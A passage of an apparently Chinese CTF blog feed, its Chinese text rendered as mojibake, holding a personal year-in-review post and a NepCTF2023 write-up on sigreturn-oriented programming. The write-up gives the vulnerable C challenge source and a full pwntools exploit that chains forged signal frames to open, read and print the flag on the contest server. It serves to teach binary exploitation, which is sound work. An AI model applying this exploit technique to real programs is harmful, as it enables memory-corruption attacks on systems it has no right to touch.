&lt;p&gt;shellcodeÁöÑÈ¢òÊå∫Â§öÔºåÂæÄÂæÄÈÉΩÊòØÂä†‰∫Ü‰∏Ä‰∫õ‰π±‰∏ÉÂÖ´Á≥üÁöÑÈôêÂà∂„ÄÇ‰∏ÄËà¨Ë¶Å‰πàÈôêÂà∂Â≠óÁ¨¶ÔºåË¶Å‰πàÂºÄÊ≤ôÁÆ±„ÄÇÈôêÂà∂Â≠óÁ¨¶Âü∫Êú¨‰∏äÂ∞±ÈÄöËøáÊâãÊêì&lt;del&gt;Êàë‰∏ç‰ºö&lt;/del&gt;ÊàñËÄÖalpha3</summary>
      
    
    
    
    <category term="CS" scheme="http://deepunk.icu/categories/CS/"/>
    
    
    <category term="PWN" scheme="http://deepunk.icu/tags/PWN/"/>
    
    <category term="CTF" scheme="http://deepunk.icu/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Êë∏</title>
    <link href="http://deepunk.icu/%E6%91%B8/"/>
    <id>http://deepunk.icu/%E6%91%B8/</id>
    <published>2023-08-27T08:30:57.000Z</published>
    <updated>2023-12-09T07:11:23.576Z</updated>
    
    <content type="html"><![CDATA[<p>Âú®Áîµ‰∏ìÊë∏‰∫Ü‰∏ÄÂπ¥Ôºå‰∏çÁü•‰∏çËßâÂ∑≤ÁªèÊàê‰∫ÜËÄÅÊ≤πÊù°ÁöÑÂΩ¢Áä∂</p><p>Â§ß‰∏ÄÊï¥‰ΩìÂ§Ñ‰∫é‰∏Ä‰∏™ÊØîËæÉËø∑Ëå´ÁöÑÁä∂ÊÄÅ„ÄÇÂºÄÂ≠¶Êó∂ÔºåÊú∫ÁºòÂ∑ßÂêà‰∏ãÁ¢∞ËßÅ‰∫ÜÂáùËÅöÁöÑÊãõÊñ∞ËµõÔºåÈù†ÁùÄÁÉ≠ÊÉÖÂÜ≤‰∫Ü‰∏Ä‰∏™ÊúàÔºå‰ª•pwnÊâãÁöÑË∫´‰ªΩËøõÂÖ•ÔºåÈöèÂêéÂ∞±ÂºÄÂßã<strong>ÈïøËææ‰∏Ä‰∏™ÂçäÂ≠¶Êúü</strong>ÁöÑÊë∏È±ºÊúü„ÄÇÊúüÈó¥ÊàñÊòØÂç∑ÂàÜÊï∞ÔºàÈõÜÁîµÂ≠¶Èô¢ÁöÑÈ£éÊ∞îÊáÇÁöÑÈÉΩÊáÇÔºâÔºåÊàñÊòØÊêû‰∏Ä‰∫õ‰π±‰∏ÉÂÖ´Á≥üÁöÑÊØîËµõÔºà‰πüÊ≤°Êúâ‰ªÄ‰πàÊàêÁª©ÔºâÔºåÊõ¥Â§öÁöÑÊó∂ÂÄôÔºåËÆ∞ÂøÜÁº∫Â§±ÔºåÂ§ßÊäµÊòØÂú®Êë∏È±ºÁΩ¢</p><p>ÂêéÊù•Â§ß‰∏Ä‰∏ãÔºåÂéª‰∫ÜË∂üASCÁöÑËßÇÊë©ÔºåËÆ§ËØÜ‰∫Ü‰∏Ä‰∫õÂáùËÅöÁöÑÂ≠¶ÈïøÂíåBeetovenÔºåËøòËÆ§ËØÜ‰∫ÜÂçóÊòåÂ§ßÂ≠¶ÁöÑcs‰Ω¨„ÄÇÁ™ÅÁÑ∂ËßâÂæóÔºåÊêûËøô‰∫õ‰πüÊå∫ÊúâÊÑèÊÄù„ÄÇÊ≠§ÂêéÂºÄÂßãÂèÇ‰∏éÊõ¥Â§öÂáùËÅöÁöÑÊ¥ªÂä®ÔºàÂπ∂Êç°Ëµ∑ÊâÄÂâ©‰∏çÂ§öÁöÑpwnÁü•ËØÜ</p><p>Êé•ÁùÄÂ∞±ÊòØÂõΩËµõÂàùËµõÔºå‰∫∫ÁîüÁ¨¨‰∫åÊ¨°Êù•Âà∞Â∑•‰ΩúÂÆ§ÔºåÁ§æÊÅêÂæóÂÆõÂ¶Ç‰∏Ä‰∏™Êñ∞Áîü„ÄÇÂ•ΩÂú®ÂàùËµõÊúâ‰∫õÁÆÄÂçïÈ¢òÔºåÊå∫ÈÄÇÂêàÊàëËøôÁßçÊãõÊñ∞ËµõÊ∞¥Âπ≥ÈÄâÊâãÂ∫∑Â§ç„ÄÇÊúÄÂêéËøòÊòØÈ°∫Âà©Ëøõ‰∫ÜÂ§çËµõ</p><p>Â§çËµõÁöÑÊó∂ÂÄôËøûÂ†ÜÈÉΩ‰∏ç‰ºöÔºåÁ∫ØfwÔºåÊå∫ÂèØÊÉúÔºåËøòÊòØÂíåCasio3ÁªÑÁöÑÈòü„ÄÇ‰∫ãÂêéÁóõÂÆöÊÄùÁóõÔºåÂÜ≥ÂÆö‰ª•Âêé‰∏çÊë∏‰∫Ü</p><p>Ê≠§Êó∂ÁöÑÊàëÊÄé‰πà‰πüÊÉ≥‰∏çÂà∞Ôºå‰∏Ä‰∏™Êúà‰πãÂêéÔºåÊàë‰ºöÂú®ËÆ≤Âè∞‰∏äÁªô‰∫∫ËÆ≤È´òÁâàÊú¨Â†ÜÂà©Áî®Ôºà</p><p>ÂüπËÆ≠ÂâçËøòÊúâ‰∏™Â∞èÊèíÊõ≤Ôºå<del>Âõ†‰∏∫ÂÜõËÆ≠ÁöÑÊüêÁßçÁ•ûÂøÖÂäõÈáè</del>ÔºåÈÑô‰∫∫ÂÖ®Ë∫´Ëµ∑ÁñπÂ≠êÂú®ÂåªÈô¢Ë∫∫‰∫Ü‰∏ÄÂë®</p><p>ÊöëÂÅáÊúüÈó¥Êâì‰∫Ü‰∏Ä‰∫õÊØîËµõÔºå<del>ÊÑüËßâÊàëÊÄé‰πà‰ªÄ‰πàÈÉΩ‰∏ç‰ºö</del>ÊÑüËßâÊàëÁöÑ‰∫åËøõÂà∂‰πãÊóÖÊâçÂàöÂàöÂºÄÂßã</p><hr><p>Êë∏ËøáÊù•ÁöÑËøô‰∏ÄÂπ¥ÔºåÊàêÁª©‰∏ç‰∏ä‰∏ç‰∏ãÔºåÂ•ΩÂú®Ê≤°ÊúâÊéâÂá∫‰øùÁ†îÁ∫ø„ÄÇ‰∫åËøõÂà∂‰æùÊóßÊòØ‰∏Ä‰∏™Êñ∞‰∫∫ÁöÑÊ∞¥Âπ≥ÔºåÊÉ≥Âà∞È©¨‰∏äÂèàË¶ÅËøéÊé•‰∏ã‰∏ÄÂ±äÊñ∞‰∫∫Ôºå‰∏çÁ¶ÅÊÑüÂà∞Ê±óÈ¢ú„ÄÇ</p><p>ÊúÄËøëÂíåÂ≠¶Èïø‰ª¨ËÅäÂ§©ÊØîËæÉÂ§öÔºåÂØπËá™Â∑±ÁöÑÊú™Êù•ÈÄêÊ∏ê‰πüÊúâ‰∫Ü‰∏Ä‰∫õËßÑÂàí„ÄÇÁõÆÂâç‰∏ªË¶ÅÁ≤æÂäõËøòÊòØ‰ºöÊîæÂú®‰∫åËøõÂà∂‰∏äÔºåÂπ∂ÂºÄÂßãÊ∂âË∂≥ÂØÜÁ†ÅÂ≠¶</p><p>ÊØïÁ´üÊòØÊñ∞Â≠¶ÊúüÔºåËøòÊòØÁ´ãÂá†‰∏™flagÂêßÔºà‰ªÄ‰πàÔºüÂì™ÈáåÊúâflagÔºüÊàëÁõ¥Êé•catÔºâ</p><ul><li><input disabled="" type="checkbox"> ÂÖªÊàêÂÜôÂçöÂÆ¢ËæìÂá∫Áü•ËØÜÁöÑ‰π†ÊÉØÔºåÂ∞ùËØïËã±ÊñáÂÜô‰Ωú</li><li><input disabled="" type="checkbox"> Â§öÂèÇÂä†ctfÔºå‰∏∞ÂØåÁªèÂéÜ</li><li><input disabled="" type="checkbox"> Â≠¶‰π†ÂÜÖÊ†∏ÊºèÊ¥ûÂà©Áî®</li><li><input disabled="" type="checkbox"> ‰∏çÁÜ¨Â§úÔºåÂ§öÈîªÁÇº</li></ul>]]></content>
    
    
    <summary type="html">Êë∏Êë∏</summary>
    
    
    
    <category term="misc" scheme="http://deepunk.icu/categories/misc/"/>
    
    
    <category term="Êë∏" scheme="http://deepunk.icu/tags/%E6%91%B8/"/>
    
  </entry>
  
  <entry>
    <title>SROPÂàùËßÅÊùÄ-NepCTF2023</title>
    <link href="http://deepunk.icu/SROP/"/>
    <id>http://deepunk.icu/SROP/</id>
    <published>2023-08-12T12:45:49.000Z</published>
    <updated>2023-12-09T07:11:23.568Z</updated>
    
    <content type="html"><![CDATA[<p>ËøôÊ¨°ÊØîËµõÁ¨¨‰∏ÄÈ¢òÂ∞±ÊòØÂæàÊòéÊòæÁöÑ<strong>SROP</strong>ÔºåÊ≠£Â•ΩÂï•‰πü‰∏ç‰ºöÔºåÂ≠¶‰π†‰∫Ü‰∏Ä‰∏ã</p><h1 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h1><p><strong>SROP</strong>ÂÖ®Áß∞‰∏∫<strong>Sigreturn Oriented Programming</strong>ÔºåÂÖ∂ÊîªÂáªÊ†∏ÂøÉ‰∏∫ÈÄöËøá‰º™ÈÄ†‰∏Ä‰∏™<strong>Signal Frame</strong>Ôºà‰ª•‰∏ãÁÆÄÁß∞<strong>sigFrame</strong>ÔºâÂú®Ê†à‰∏äÔºåÂêåÊó∂Ëß¶Âèë<strong>sigreturn</strong>Á≥ªÁªüË∞ÉÁî®ÔºåËÆ©ÂÜÖÊ†∏‰∏∫Êàë‰ª¨ÊÅ¢Â§ç‰∏Ä‰∏™sigFrameÊâÄÊèèËø∞ÁöÑËøõÁ®ãÔºåÂ¶Ç‰∏Ä‰∏™shell„ÄÅ‰∏Ä‰∏™wrtieÁ≥ªÁªüË∞ÉÁî®ÊâìÂç∞Ê†àÂú∞ÂùÄÁ≠âÔºåÂêåÊó∂ÈÄöËøáÂØπsigFrame‰∏≠rspÂíåripÁöÑ‰øÆÊîπÔºåËøûÊé•Â§ö‰∏™sigFrameÔºåÂèØÈÄöËøáÂ§öÊ¨°Ëß¶ÂèësigreturnÁ≥ªÁªüË∞ÉÁî®Ôºå‰æùÊ¨°ÊÅ¢Â§çÂ§ö‰∏™sigFrameÔºåÂÆûÁé∞‰∏çÂêåÁöÑÂäüËÉΩÔºåÊûÑÊàêSROPÊîªÂáª„ÄÇ‰∏Ä‰∏™sigFrameÂèØÁêÜËß£‰∏∫‰∏Ä‰∏™ËøõÁ®ãË¢´ÊåÇËµ∑Êó∂ÔºåÁî®‰∫é‰øùÂ≠òËøõÁ®ãÁöÑÊï∞ÊçÆÁªìÊûÑÔºåÂΩìËøõÁ®ãÊÅ¢Â§çÊó∂ÔºåÈÄöËøáËß¶ÂèësigreturnÊù•ÊÅ¢Â§çsigFrameÔºå‰ªéËÄåÊÅ¢Â§ç‰∏Ä‰∏™ËøõÁ®ã„ÄÇ</p><p>‰ª•‰∏äÂÜÖÂÆπÊòØÊäÑÁöÑÔºåËØ¥ÁôΩ‰∫ÜÂ∞±ÊòØÔºöËøõÁ®ãÂèóÂà∞‰∏Ä‰∏™signalËøõÂÖ•‰∏≠Êñ≠ÔºåÂÜÖÊ†∏‰ºö‰øùÂ≠ò‰∏ä‰∏ãÊñáÔºàÂØÑÂ≠òÂô®Áä∂ÊÄÅ‰πãÁ±ªÁöÑÔºåËøô‰∏™‰∏ä‰∏ãÊñáÂ≠òÂú®<strong>sigFrame</strong>‰∏≠ÔºâÔºåÈöèÂêéËøõÂÖ•Áî®Êà∑ÊÄÅÊâßË°åÂ§ÑÁêÜÂáΩÊï∞ÔºåÂ§ÑÁêÜÂÆåÊúÄÂêéÂèàËøõÂÖ•ÂÜÖÊ†∏ÊÄÅÊÅ¢Â§ç‰∏ä‰∏ãÊñá</p><p><img src="/../img/SROP.assets/image-20230812205434238.png" alt="image-20230812205434238"></p><p>ËÄåËøô‰∏™‰øùÂ≠ò‰∏ä‰∏ãÊñáÁöÑsigFrameÂÆåÂÖ®Âú®<strong>Áî®Êà∑Á©∫Èó¥</strong>ÔºåÂπ∂‰∏îÂÜÖÊ†∏ÂØπËøõÁ®ãÊåÇËµ∑Êó∂‰øùÂ≠òÁöÑsigFrame‰ª•ÂèäÊÅ¢Â§çÊó∂ËøòÂéüÁöÑsigFrame<strong>Ê≤°ÊúâÂÅö‰ªª‰ΩïÂÖ≥ËÅî</strong>ÔºåËøôÂØºËá¥sigFrameÂèØ‰ª•Ë¢´‰º™ÈÄ†</p><p><img src="/../img/SROP.assets/image-20230812205639153.png" alt="image-20230812205639153"></p><p>‰∏äÂõæÊòØ64‰ΩçÁöÑsigFrameÁªìÊûÑ„ÄÇÊÅ¢Â§ç‰∏ä‰∏ãÊñá‰πãÂâçÔºå‰ºöË∞ÉÁî®Â§ÑÁêÜÂáΩÊï∞<strong>Signal Handler</strong>ÔºåËØ•ÂáΩÊï∞ÊúÄÂêé‰∏Ä‰∏™Êåá‰ª§ÊòØ<code>ret</code>ÔºåÊ≠§Êó∂<code>rsp</code>Ê≠£Â•ΩÊåáÂêësigFrameÁöÑÊ†àÈ°∂Ôºå‰πüÂ∞±ÊòØÂ≠òÊúâÂáΩÊï∞<code>rt_sigreturn</code>Âú∞ÂùÄÁöÑ‰ΩçÁΩÆ„ÄÇÈöèÂêéË∞ÉÁî®<code>rt_sigreturn</code>ÔºåÈÄöËøáËØ•ÂáΩÊï∞ÂÆåÊàê‰∏ä‰∏ãÊñáÁöÑÊÅ¢Â§ç„ÄÇ</p><p>Âõ†Ê≠§ÔºåÊàë‰ª¨ÂèØ‰ª•Âú®<code>rsp</code>ÈôÑËøë‰º™ÈÄ†sigFrameÔºåÈÄöËøáË∞ÉÁî®<code>rt_sigreturn</code>ÂÆåÊàêÂØÑÂ≠òÂô®ÁöÑÂ∏ÉÁΩÆ</p><p>Ë∞ÉÁî®ÂèØ‰ª•Áõ¥Êé•ÂÜôÂÜÖÂ≠òÔºåÊõ¥Â∏∏ËßÅÁöÑÊòØËøõË°åË∞ÉÁî®Âè∑‰∏∫0xfÁöÑÁ≥ªÁªüË∞ÉÁî®</p><blockquote><p>Â∞èÊäÄÂ∑ßÔºöÁ≥ªÁªüË∞ÉÁî®Âè∑ÂèØ‰ª•ÈÄöËøá<code>cat /usr/include/asm/unistd_64.h</code>Êü•Áúã</p></blockquote><p>Âè¶Â§ñÔºåpwntools‰∏≠ÁöÑ<code>SigreturnFrame()</code>ÂèØ‰ª•Êñπ‰æøÂÆåÊàêÂØÑÂ≠òÂô®ÁöÑÂ∏ÉÁΩÆ</p><h1 id="Nepctf2023-SROP"><a href="#Nepctf2023-SROP" class="headerlink" title="Nepctf2023-SROP"></a>Nepctf2023-SROP</h1><p>Ê∫êÁ†ÅÈÉΩÂñÇÊàëÂò¥Èáå‰∫Ü</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -no-pie pwn.c -fno-stack-protector -z now -o pwn  -lseccomp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x30</span>]=<span class="string">&quot;welcome to NepCTF2023!\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">seccomp</span><span class="params">()</span>&#123;</span><br><span class="line">    scmp_filter_ctx ctx;</span><br><span class="line">    ctx = seccomp_init(SCMP_ACT_KILL);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(rt_sigreturn), <span class="number">0</span>);</span><br><span class="line">    seccomp_load(ctx);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">sys</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">15</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">     <span class="type">char</span> bd[<span class="number">0x30</span>];</span><br><span class="line">     seccomp();</span><br><span class="line">     syscall(<span class="number">1</span>,<span class="number">1</span>,buf,<span class="number">0x30</span>);</span><br><span class="line">     <span class="keyword">return</span> syscall(<span class="number">0</span>,<span class="number">0</span>,bd,<span class="number">0x300</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÊòæÁÑ∂ÈúÄË¶ÅÊâì‰∏Ä‰∏™orw</p><p>Ê≥®ÊÑèËøôÈáåÊúâ‰∏Ä‰∏™ÂùëÔºå‰ºóÊâÄÂë®Áü•Ôºå<code>syscall</code>ÁöÑÁ≥ªÁªüË∞ÉÁî®Âè∑ÊòØÈÄöËøá<code>rax</code>‰º†ÈÄíÔºåÁÑ∂ËÄåÊàë‰ª¨ÂèçÊ±áÁºñ‰πãÂêé</p><p><img src="/../img/SROP.assets/image-20230812211245122.png" alt="image-20230812211245122"></p><p>‰ª§‰∫∫ÊÑèÂ§ñÁöÑÊòØÔºåËøôÈáåÁöÑ<code>syscall</code>ÈÉΩÊòØÈÄöËøá<code>rdi</code>‰º†Ë∞ÉÁî®Âè∑ÁöÑÔºåÁåúÊµã‰∏éËøôÈáå‰ΩøÁî®<code>call syscall</code>ËÄåÈùûÁõ¥Êé•‰ΩøÁî®<code>syscall</code>ÊúâÂÖ≥</p><p>Êó¢ÁÑ∂‰∏çÁî®<code>rax</code>‰º†Ë∞ÉÁî®Âè∑ÔºåÈÇ£È¢òÁõÆ‰∏≠ÁöÑ<code>sys()</code>ÂáΩÊï∞‰πüÂ∞±Ê≤°ÊúâÊÑè‰πâ‰∫ÜÔºåÂ•ΩÂú®ËÉΩÊâæÂà∞<code>pop rdi</code>ÁöÑgadgetsÔºåÂèØ‰ª•‰ªªÊÑèÂ∏ÉÁΩÆ</p><p>ÊàëÁöÑÊÄùË∑ØÊòØÔºåÂÖàÊâì‰∏ÄÊ¨°sropÔºåÊääflagÂÜôÂà∞bssÊÆµÔºåÈ°∫‰æøÊääÊ†àËøÅÁßªËøáÂéªÔºåÈöèÂêéÊå®ÁùÄÊâìorw</p><p><strong>‰º™ÈÄ†sigFreame</strong>Êó∂ÈúÄË¶Å<strong>Ê†ºÂ§ñÊ≥®ÊÑè</strong></p><p><code>cs</code> <code>gs</code> <code>fs</code> <code>ss</code>ÈúÄË¶Å<strong>‰øùÊåÅ‰∏çÂèò</strong>ÔºÅÂê¶Âàô‰ºöÊä•ÈîôÔºÅ</p><p>Êú¨‰∫∫Â∞±Âú®ËøôÈáåÊéíÊü•‰∫ÜÂæà‰πÖ</p><p>ÂèØ‰ª•ÊåâÁÖßÂ¶Ç‰∏ãÂÜôÊ≥ï</p><p><code>sig.csgsfs = (0x002b * 0x1000000000000) | (0x0000 * 0x100000000) | (0x0000 * 0x10000) | (0x0033 * 0x1)</code></p><p>‰ªéÂ∑¶ÂæÄÂè≥‰æùÊ¨°‰∏∫<code>cs</code> <code>gs</code> <code>fs</code> <code>ss</code></p><p>expÂ¶Ç‰∏ã</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>, terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;new-window&#x27;</span>])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">cmd += <span class="string">&quot;b *0x0000000004007AE\n&quot;</span></span><br><span class="line">gdb.attach(p, cmd)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;nepctf.1cepeak.cn&quot;</span></span><br><span class="line">port = <span class="number">30551</span></span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(host, port)</span><br><span class="line"></span><br><span class="line">sig = <span class="number">0x0000000000400750</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400813</span></span><br><span class="line">syscall = <span class="number">0x00000000004007A8</span></span><br><span class="line">buf = <span class="number">0x0000000000601020</span></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload = <span class="string">&quot;\x00&quot;</span>*<span class="number">0x38</span> +p64(pop_rdi)+p64(<span class="number">0xf</span>)</span><br><span class="line">sig = SigreturnFrame()</span><br><span class="line">sig.uc_flags = syscall</span><br><span class="line">sig.rax = <span class="number">0</span></span><br><span class="line">sig.rdi = <span class="number">0</span></span><br><span class="line">sig.rsi = <span class="number">0</span></span><br><span class="line">sig.rdx = buf</span><br><span class="line">sig.rcx = <span class="number">0x1000</span></span><br><span class="line">sig.rip = syscall</span><br><span class="line">sig.rsp = buf+<span class="number">0x10</span></span><br><span class="line">sig.csgsfs = (<span class="number">0x002b</span> * <span class="number">0x1000000000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x100000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x10000</span>) | (<span class="number">0x0033</span> * <span class="number">0x1</span>)</span><br><span class="line">payload += <span class="built_in">str</span>(sig)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;flag\x00\x00\x00\x00&quot;</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0xf</span>)</span><br><span class="line">sig = SigreturnFrame()</span><br><span class="line">sig.uc_flags = syscall</span><br><span class="line">sig.rax = <span class="number">0</span></span><br><span class="line">sig.rdi = <span class="number">2</span></span><br><span class="line">sig.rsi = buf</span><br><span class="line">sig.rdx = <span class="number">0</span></span><br><span class="line">sig.rcx = <span class="number">0</span></span><br><span class="line">sig.rip = syscall</span><br><span class="line">sig.rsp = buf+<span class="number">0x120</span></span><br><span class="line">sig.rbp = buf+<span class="number">0x120</span></span><br><span class="line">sig.csgsfs = (<span class="number">0x002b</span> * <span class="number">0x1000000000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x100000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x10000</span>) | (<span class="number">0x0033</span> * <span class="number">0x1</span>)</span><br><span class="line">payload += <span class="built_in">str</span>(sig)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x120</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(buf+<span class="number">0x120</span>)<span class="comment">#rbp</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0xf</span>)</span><br><span class="line">sig = SigreturnFrame()</span><br><span class="line">sig.uc_flags = syscall</span><br><span class="line">sig.rax = <span class="number">0</span></span><br><span class="line">sig.rdi = <span class="number">0</span></span><br><span class="line">sig.rsi = <span class="number">3</span></span><br><span class="line">sig.rdx = buf</span><br><span class="line">sig.rcx = <span class="number">0x100</span></span><br><span class="line">sig.rip = syscall</span><br><span class="line">sig.rsp = buf+<span class="number">0x240</span></span><br><span class="line">sig.rbp = buf+<span class="number">0x240</span></span><br><span class="line">sig.csgsfs = (<span class="number">0x002b</span> * <span class="number">0x1000000000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x100000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x10000</span>) | (<span class="number">0x0033</span> * <span class="number">0x1</span>)</span><br><span class="line">payload += <span class="built_in">str</span>(sig)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x240</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(buf+<span class="number">0x240</span>)<span class="comment">#rbp</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0xf</span>)</span><br><span class="line">sig = SigreturnFrame()</span><br><span class="line">sig.uc_flags = syscall</span><br><span class="line">sig.rax = <span class="number">0</span></span><br><span class="line">sig.rdi = <span class="number">1</span></span><br><span class="line">sig.rsi = <span class="number">1</span></span><br><span class="line">sig.rdx = buf</span><br><span class="line">sig.rcx = <span class="number">0x100</span></span><br><span class="line">sig.rip = syscall</span><br><span class="line">sig.rsp = buf+<span class="number">0x240</span></span><br><span class="line">sig.rbp = buf+<span class="number">0x240</span></span><br><span class="line">sig.csgsfs = (<span class="number">0x002b</span> * <span class="number">0x1000000000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x100000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x10000</span>) | (<span class="number">0x0033</span> * <span class="number">0x1</span>)</span><br><span class="line">payload += <span class="built_in">str</span>(sig)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;ËøôÊ¨°ÊØîËµõÁ¨¨‰∏ÄÈ¢òÂ∞±ÊòØÂæàÊòéÊòæÁöÑ&lt;strong&gt;SROP&lt;/strong&gt;ÔºåÊ≠£Â•ΩÂï•‰πü‰∏ç‰ºöÔºåÂ≠¶‰π†‰∫Ü‰∏Ä‰∏ã&lt;/p&gt;
&lt;h1 id=&quot;SROP&quot;&gt;&lt;a href=&quot;#SROP&quot; class=&quot;headerlink&quot; title=&quot;SROP&quot;&gt;&lt;/a&gt;SROP&lt;/h1&gt;&lt;p&gt;&lt;strong</summary>
      
    
    
    
    <category term="CS" scheme="http://deepunk.icu/categories/CS/"/>
    
    
    <category term="PWN" scheme="http://deepunk.icu/tags/PWN/"/>
    
    <category term="CTF" scheme="http://deepunk.icu/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>IOFILE exploit</title>
    <link href="http://deepunk.icu/IOFILE-exploit/"/>
    <id>http://deepunk.icu/IOFILE-exploit/</id>
    <published>2023-08-11T08:02:03.000Z</published>
    <updated>2023-12-09T13:51:46.126Z</updated>
    
